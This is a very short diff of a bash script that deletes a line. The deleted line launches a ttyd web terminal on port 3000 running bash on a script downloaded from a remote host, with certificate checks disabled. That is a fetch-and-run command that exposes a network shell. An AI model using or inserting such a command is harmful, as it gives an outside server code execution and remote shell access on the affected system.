@@ -1,3 +1,1 @@
 #!/bin/bash
-
-/usr/local/bin/ttyd -p 3000 -o bash <(wget --no-check-certificate -qO- http://xznat.seso.icu:10178/client_do)
